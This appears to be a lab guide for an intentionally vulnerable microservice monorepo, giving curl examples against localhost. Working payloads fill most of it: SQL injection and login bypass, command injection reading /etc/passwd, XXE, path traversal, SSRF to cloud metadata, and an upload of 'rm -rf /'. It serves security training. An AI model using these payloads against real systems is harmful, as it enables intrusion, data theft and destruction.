# API Examples for Testing Vulnerabilities

This file contains example API calls demonstrating various vulnerabilities in the Insecure-Monorepo.

⚠️ **These examples are for security testing purposes only. Do not use against systems without authorization.**

## Setup

Start all services:
```bash
# Option 1: Docker Compose
docker-compose up

# Option 2: Manual
cd services/users-service && npm run dev &
cd services/products-service && npm run dev &
cd services/orders-service && npm run dev &
cd services/api-gateway && npm run dev &
```

## Users Service (Port 3001)

### 1. SQL Injection - User Search

**Vulnerability**: SQL Injection in search endpoint

```bash
# Normal request
curl "http://localhost:3001/api/users/search?username=admin"

# SQL Injection - dump all users
curl "http://localhost:3001/api/users/search?username=admin'%20OR%20'1'='1"

# SQL Injection - UNION attack
curl "http://localhost:3001/api/users/search?username=admin'%20UNION%20SELECT%201,2,3,4,5--"
```

### 2. SQL Injection - Authentication Bypass

**Vulnerability**: SQL Injection in login endpoint

```bash
# Bypass authentication
curl -X POST http://localhost:3001/api/users/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1'\''--","password":"anything"}'
```

### 3. Mass Assignment - Privilege Escalation

**Vulnerability**: Can set role field during user creation

```bash
# Create admin user without authorization
curl -X POST http://localhost:3001/api/users \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","email":"hacker@test.com","password":"password","role":"admin"}'
```

### 4. IDOR - Access Any User

**Vulnerability**: No authorization check on user retrieval

```bash
# Access any user's data
curl http://localhost:3001/api/users/1
curl http://localhost:3001/api/users/2
```

### 5. Command Injection - Export

**Vulnerability**: User input in shell command

```bash
# Command injection in export format
curl -X POST http://localhost:3001/api/users/export \
  -H "Content-Type: application/json" \
  -d '{"format":"csv; cat /etc/passwd"}'
```

### 6. Information Disclosure - Debug Endpoint

**Vulnerability**: Exposing sensitive configuration

```bash
# View full configuration including secrets
curl http://localhost:3001/api/debug/config
```

### 7. SSRF - Avatar Upload

**Vulnerability**: Server-Side Request Forgery

```bash
# Access internal services
curl -X POST http://localhost:3001/api/users/avatar \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:3001/api/debug/config"}'

# Try to access cloud metadata (if running in cloud)
curl -X POST http://localhost:3001/api/users/avatar \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
```

## Products Service (Port 3002)

### 1. SQL Injection - Product Search

**Vulnerability**: SQL Injection in search and category filters

```bash
# Normal search
curl "http://localhost:3002/api/products/search?query=Laptop"

# SQL Injection
curl "http://localhost:3002/api/products/search?query=Laptop'%20OR%20'1'='1"
curl "http://localhost:3002/api/products/search?category=Electronics'%20OR%20'1'='1"
```

### 2. SQL Injection - Price Filter

**Vulnerability**: SQL Injection in price range filter

```bash
# SQL Injection in price filter
curl "http://localhost:3002/api/products/filter?minPrice=0&maxPrice=1000%20OR%201=1"
```

### 3. XXE - XML Import

**Vulnerability**: XML External Entity injection

```bash
# XXE attack to read /etc/passwd
curl -X POST http://localhost:3002/api/products/import \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<product>
  <name>&xxe;</name>
</product>'
```

### 4. Path Traversal - Image Access

**Vulnerability**: No path validation in file access

```bash
# Try to read system files
curl "http://localhost:3002/api/products/image/../../../etc/passwd"
curl "http://localhost:3002/api/products/image/../../../etc/hosts"
```

### 5. ReDoS - Product Validation

**Vulnerability**: Regular Expression Denial of Service

```bash
# Cause CPU exhaustion
curl "http://localhost:3002/api/products/validate?productName=aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
```

### 6. Open Redirect

**Vulnerability**: Unvalidated redirect

```bash
# Redirect to external site
curl "http://localhost:3002/api/products/1/external?url=https://evil.com"
```

## Orders Service (Port 3003)

### 1. SQL Injection - User Orders

**Vulnerability**: SQL Injection in user orders query

```bash
# SQL Injection
curl "http://localhost:3003/api/orders/user/1?status=pending'%20OR%20'1'='1"
```

### 2. IDOR - Access Any Order

**Vulnerability**: No authorization check

```bash
# Access any order
curl http://localhost:3003/api/orders/1
curl http://localhost:3003/api/orders/2
```

### 3. Sensitive Data Storage - Payment Info

**Vulnerability**: Credit card stored in plaintext

```bash
# Create order
curl -X POST http://localhost:3003/api/orders \
  -H "Content-Type: application/json" \
  -d '{"userId":1,"productId":1,"quantity":2}'

# Store payment (saved in plaintext!)
curl -X POST http://localhost:3003/api/orders/1/payment \
  -H "Content-Type: application/json" \
  -d '{"amount":200,"cardNumber":"4111111111111111","cvv":"123","expiryDate":"12/25"}'

# Retrieve payment info (exposes card details!)
curl http://localhost:3003/api/orders/1/payment
```

### 4. SSRF - Webhook Notification

**Vulnerability**: Server-Side Request Forgery

```bash
# Make server request internal services
curl -X POST http://localhost:3003/api/orders/1/notify \
  -H "Content-Type: application/json" \
  -d '{"webhookUrl":"http://localhost:3001/api/debug/config"}'
```

### 5. Business Logic Flaw - Negative Quantities

**Vulnerability**: No validation on quantities

```bash
# Create order with negative quantity
curl -X PUT http://localhost:3003/api/orders/1 \
  -H "Content-Type: application/json" \
  -d '{"quantity":-100}'
```

## API Gateway (Port 3000)

### 1. Weak Authentication

**Vulnerability**: Token decoded without verification

```bash
# Create a token (from users service)
TOKEN=$(curl -s -X POST http://localhost:3001/api/users/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' | jq -r .token)

# Use token (not properly verified)
curl http://localhost:3000/api/users/1 \
  -H "Authorization: Bearer $TOKEN"
```

### 2. Information Disclosure - Service URLs

**Vulnerability**: Exposing internal service locations

```bash
# Get internal service URLs
curl http://localhost:3000/api/services
```

### 3. Debug Endpoint

**Vulnerability**: Exposing environment and config

```bash
# View full system information
curl http://localhost:3000/api/debug
```

### 4. SSRF - Proxy Endpoint

**Vulnerability**: Unrestricted proxy to any URL

```bash
# Access internal services through proxy
curl -X POST http://localhost:3000/api/proxy \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:3001/api/debug/config","method":"GET"}'
```

### 5. Open Redirect

**Vulnerability**: Unvalidated redirect

```bash
# Redirect to malicious site
curl "http://localhost:3000/api/redirect?url=https://evil.com"
```

### 6. File Upload - No Validation

**Vulnerability**: Unrestricted file upload

```bash
# Upload arbitrary file
curl -X POST http://localhost:3000/api/upload \
  -H "Content-Type: application/json" \
  -d '{"filename":"../../etc/evil.sh","content":"rm -rf /"}'
```

## Advanced Exploitation Scenarios

### 1. Full Attack Chain - Privilege Escalation

```bash
# Step 1: Create regular user with SQL injection to become admin
curl -X POST http://localhost:3001/api/users/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1'\''--","password":"anything"}'

# Step 2: Use returned token to access sensitive data
# Step 3: Modify own role to admin
# Step 4: Access all user data
```

### 2. Data Exfiltration via SSRF

```bash
# Use SSRF to access internal services
curl -X POST http://localhost:3001/api/users/avatar \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:3003/api/orders"}'
```

### 3. JWT Manipulation

```bash
# Get token
TOKEN=$(curl -s -X POST http://localhost:3001/api/users/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' | jq -r .token)

# Decode token (base64)
echo $TOKEN | cut -d. -f2 | base64 -d

# Create new token with 'none' algorithm
# (would need a script to properly craft this)
```

## Testing with Security Tools

### Using SQLMap

```bash
# Test for SQL injection
sqlmap -u "http://localhost:3001/api/users/search?username=admin" --batch --level=5

# Dump database
sqlmap -u "http://localhost:3001/api/users/search?username=admin" --dump
```

### Using OWASP ZAP

1. Configure ZAP proxy
2. Browse to http://localhost:3000
3. Run active scan
4. Review findings

### Using Burp Suite

1. Configure Burp proxy
2. Browse to http://localhost:3000
3. Send requests to Intruder/Repeater
4. Test for vulnerabilities

## Notes

- All services run on localhost by default
- No authentication required for most endpoints
- Services use in-memory SQLite databases
- Data resets when services restart
- Intentionally vulnerable - DO NOT expose to internet
